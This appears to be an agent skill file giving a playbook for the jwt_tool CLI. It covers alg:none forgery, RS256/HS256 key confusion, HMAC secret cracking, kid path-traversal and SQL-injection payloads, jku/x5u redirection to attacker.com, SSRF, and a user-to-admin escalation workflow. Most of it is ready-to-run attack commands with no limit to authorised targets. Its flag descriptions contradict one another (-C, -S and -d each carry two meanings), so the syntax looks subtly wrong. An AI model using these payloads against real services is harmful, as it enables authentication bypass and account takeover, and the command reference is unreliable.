---
name: jwt-tool
description: jwt_tool CLI playbook covering algorithm confusion (none/HS256/RS256), weak HMAC cracking, kid/jku/x5u injection, claim tampering, and JWT-specific bypass techniques
---

# jwt_tool Playbook

Official docs:
- https://github.com/ticarpi/jwt_tool
- https://github.com/ticarpi/jwt_tool/wiki

jwt_tool is the dedicated JWT attack toolkit — far more thorough than manual `python-jose` scripts. It handles algorithm confusion, key confusion, claim tampering, weak-secret cracking, and known-bypass techniques out of the box.

## Canonical Syntax

`python3 jwt_tool.py <JWT> [options]`

Or, if installed as a script: `jwt_tool <JWT> [options]`

## High-Signal Flags

**Input**
- `<JWT>` the token to test
- `-r <request_file>` raw HTTP request (jwt_tool extracts the token)
- `-k <key>` signing key (for verification or for HS256/RS256 confusion)
- `-pk <pem>` RSA public/private key (PEM file)
- `-jw <url>` JWKS URL
- `-S <file>` wordlist of secrets to try (HMAC brute-force)

**Attacks (select one or more)**
- `-T` tamper mode — opens interactive mode to modify claims
- `-C <claim>` tamper specific claim (e.g., `-C sub=admin`)
- `-S` brute-force HMAC secret (use with `-w <wordlist>`)
- `-E` exploit known algorithm/key confusion attacks
- `-V` verify token signature
- `-I` identify JWT type and headers
- `-A` attack mode (combined: verify + scan + tamper candidates)

**Tampering helpers**
- `-T -p <claim>` change a claim value (interactive)
- `-T -pc` change a claim type (string → integer, etc.)
- `-T -h` algorithm confusion to none
- `-T -k <key>` re-sign with a different key
- `-T -pk <pem>` re-sign with a public/private key
- `-T -a <alg>` set signing algorithm

**Exploit modes (with `-X`)**
- `-X a` none algorithm
- `-X k` key confusion (RS256 ↔ HS256)
- `-X i` inject in `kid` claim
- `-X j` inject in `jku`/`x5u` claim
- `-X m` exploit `x5c` chain
- `-X t` timestamp manipulation (exp, nbf, iat)
- `-X c` claim tampering with auto-signing

**Output**
- `-d <dict>` custom header/claims JSON
- `-o <file>` write tampered JWT to file
- `-v` verbose (show all attacks tried)

## Common Patterns

**Identify / inspect a JWT:**
```
jwt_tool <JWT>
```

**Verify a token against a known secret:**
```
jwt_tool <JWT> -V -k "my-secret"
```

**Brute-force a weak HMAC secret:**
```
jwt_tool <JWT> -C -d /usr/share/wordlists/rockyou.txt
# or
hashcat -m 16500 token.txt /usr/share/wordlists/rockyou.txt
```

**Algorithm confusion — `alg: none`:**
```
jwt_tool <JWT> -X a
# Outputs a token with alg: none and empty signature
```

**Algorithm confusion — RS256 → HS256 (use public key as HMAC secret):**
```
jwt_tool <JWT> -X k -pk public.pem
```

**Inject into `kid` claim:**
```
jwt_tool <JWT> -X i -pk public.pem
# Sends variants: kid=../../../dev/null, kid=1' UNION SELECT 'secret' --, etc.
```

**Inject into `jku`/`x5u`:**
```
jwt_tool <JWT> -X j -pk public.pem
# Sends tokens where jku/x5u points to attacker-controlled JWKS
```

**Tamper claims interactively:**
```
jwt_tool <JWT> -T
# Interactive mode: lists all claims, lets you change values, re-signs
```

**Tamper specific claim and re-sign with key:**
```
jwt_tool <JWT> -C -p sub -v "admin" -k "my-secret"
# Replaces sub: "user" with sub: "admin", re-signs with my-secret
```

**Test all algorithm/key confusion attacks:**
```
jwt_tool <JWT> -E -pk public.pem
# Tries none, HS256-with-RSA-pubkey, alg confusion, etc.
```

**Sign with custom header (e.g., jku injection):**
```
jwt_tool <JWT> -d '{"alg":"HS256","typ":"JWT","jku":"http://attacker.com/jwks.json"}' -k "my-secret"
```

**Time manipulation (extend expiry):**
```
jwt_tool <JWT> -X t
# Generates variants: exp=0 (never expires), exp=<future>, nbf=-1, etc.
```

**Verbose combined scan:**
```
jwt_tool <JWT> -A -v -S /usr/share/wordlists/rockyou.txt -pk public.pem
```

## Attack Mode Reference (`-X`)

| Mode | What it does | Output |
|---|---|---|
| `a` | alg:none | token with `alg:none` and empty signature |
| `k` | Key confusion | HS256 token signed with the RSA public key |
| `i` | `kid` injection | tokens with various `kid` values (path traversal, SQLi, etc.) |
| `j` | `jku`/`x5u` injection | tokens pointing `jku`/`x5u` to attacker-controlled URLs |
| `m` | `x5c` chain | tokens with attacker-controlled `x5c` chain |
| `t` | Timestamp tampering | tokens with extended expiry / no `nbf` / backdated `iat` |
| `c` | Claim tampering | tokens with modified claims, auto-re-signed with provided key |

**Combine modes:** `-X ak` runs `a` and `k` together; `-X akjt` runs all four.

## Common WAF / Library Bypass

**Bypass RSA→HMAC confusion (server explicitly checks `alg`):**
- Use `alg: HS256` but a public key as the secret — works when the library reads `alg` from the token
- Or use a real `alg: RS256` token but with a new private key you control (fails signature verification but tests if server re-checks)

**Bypass `kid` filter:**
- If the server blocks `kid` with `../`, try `%2e%2e%2f` (URL-encoded)
- If the server uses `kid` as a SQL WHERE parameter: `kid = "1 UNION SELECT 'attacker-key' --"`
- If the server uses `kid` as a file path with `.pem` appended: `kid = "../../../dev/null\x00"` (null byte, ASP/legacy)
- If the server uses `kid` as a JWK key ID: register your own key in JWKS with the same `kid`

**Bypass `jku`/`x5u` validation:**
- If the server checks `jku` is on the same domain, try SSRF: `jku = "http://localhost:6379/..."` (Redis SSRF to override JWKS)
- If the server checks `jku` is HTTPS, use `https://attacker.com/jwks.json` with valid cert
- DNS rebinding: domain that resolves to your IP first, then target's IP

**Bypass audience check (`aud`):**
- Set `aud` to multiple values: `aud = ["api", "admin-api"]` — some libraries only check first match
- Set `aud` to an array of the same value twice
- Set `aud` to an empty string `""` — some libraries treat as wildcard

**Bypass `iss` check:**
- Try null/empty
- Try `iss` as array
- Try `iss` matching a substring (`"https://auth.target.com"` matches `"https://auth.target.com/issuer"`)

## Exploitation Workflow

1. **Capture the token** — login as a normal user, save the JWT
2. **Identify signing algorithm** — `-I` or just read the header
3. **Discover the public key** (for RS256/ES256) — `/jwks.json`, `/oauth/certs`, `/.well-known/openid-configuration` → `jwks_uri`
4. **Try `alg: none`** — `-X a`
5. **Try key confusion** — `-X k -pk public.pem`
6. **Try weak HMAC** — `-C -d rockyou.txt` (only if HS256/HS384/HS512)
7. **Try `kid` injection** — `-X i -pk public.pem`
8. **Try `jku` injection** — `-X j`
9. **Identify the API's actual claim semantics** — `sub` is user ID, `role`/`scope`/`permissions` are auth claims
10. **Tamper claims** — `-T` to change `sub=admin` or add `scope=admin`
11. **Re-sign** with discovered key, confusion key, or none
12. **Replay** the tampered token against protected endpoints
13. **Validate** — actual admin-level response, or a 200 where 403 was expected

## Tampering Examples

**Vertical privilege escalation (user → admin):**
```
jwt_tool <user_jwt> -T
# Change "role": "user" to "role": "admin"
# jwt_tool prompts to re-sign with known key (or none)
```

**Horizontal privilege escalation (sub=1234 → sub=5678):**
```
jwt_tool <jwt> -T
# Change "sub": "1234" to "sub": "5678"
```

**Bypass expiry:**
```
jwt_tool <jwt> -X t
# Generates variants with exp removed / set to far future / iat backdated
```

**Add missing claim (scope/permission):**
```
jwt_tool <jwt> -T
# Add "scope": "admin" or "permissions": ["read", "write", "delete"]
```

**Cross-service token reuse:**
```
jwt_tool <jwt> -T
# Send same token to a different API that doesn't validate aud properly
```

## Critical Correctness Rules

- **Always start with `-I`** to identify the algorithm and key type
- **For RS256/ES256**, retrieve the public key first (JWKS endpoint) — needed for confusion attacks
- **For HS256/HS384/HS512**, only weak-secret cracking is the realistic path
- **Save tampered tokens** to a file: `jwt_tool ... -o tampered.jwt` — easier to replay with `curl`
- **Replay via `repeat_request`** with the tampered token in the `Authorization` header
- **Test multiple variants** — server might accept one and reject another
- **Don't forget to test `iss`/`aud`/`nbf`/`iat`** — these are often unchecked
- **Cross-test on different endpoints** — some endpoints have looser validation than others

## Failure Recovery

**No algorithm confusion works:**
- Library version may be patched — upgrade test target if you can
- Try `alg: NONE` (capitalized) — some libraries case-insensitive compare
- Try `alg: None` — Python's `jwt` library accepts it sometimes
- Try `alg: " "` (whitespace) — bypasses string-equality checks

**No weak-secret crack:**
- Try bigger wordlist (`hashcat -m 16500 -a 3`)
- Try with common app secrets (`/opt/wordlists/keys/jwt-secrets.txt`)
- Test for app-specific secrets: source code, environment variables, `.env` files

**`kid` injection doesn't work:**
- Library may not use `kid` for key lookup — check whether multiple keys are configured
- Try `kid` as a URL: `kid = "http://attacker.com/key.pem"` (some libraries fetch the kid value)
- Check the JWKS endpoint for `kid` rotation patterns

**Token rejected after tampering:**
- Server may require `typ: "JWT"` header
- Server may require specific `kid` value
- Server may validate `aud` strictly
- Replay from a fresh session — old session may be invalidated
- Check if server uses opaque tokens (not JWT) — should have been caught in `-I`

## Tool Composition

jwt_tool works best alongside:

- **hashcat** (`-m 16500`) for HS256/HS384/HS512 cracking — much faster than `-C` brute-force
- **Proxy tools** for replaying tampered tokens against the API
- **jose** (CLI) for header inspection and signing
- **python-jose** / **PyJWT** for custom token crafting beyond jwt_tool's scope
- **Burp JWT extension** for browser-based testing
- **`web_search` / `exploit_search`** for current 2025-2026 library-specific CVEs (e.g., CVE-2022-29249 PyJWT, CVE-2022-23529 jose)
- **`interactsh` skill** for OOB when JWT keys are exfiltrated via SSRF to JWKS

## When jwt_tool Isn't Enough

- **Encrypted JWTs (JWE)** — use a JWE-aware library; jwt_tool doesn't handle encryption
- **PASETO tokens** — different format, not vulnerable to JWT-specific attacks
- **Custom token formats** (e.g., custom claims in headers) — manual Python parsing
- **Opaque tokens** (random strings, not JWT) — must introspect the token endpoint

If uncertain, query `web_search` with:
`"jwt" "<library>" "bypass" OR "CVE" 2025`
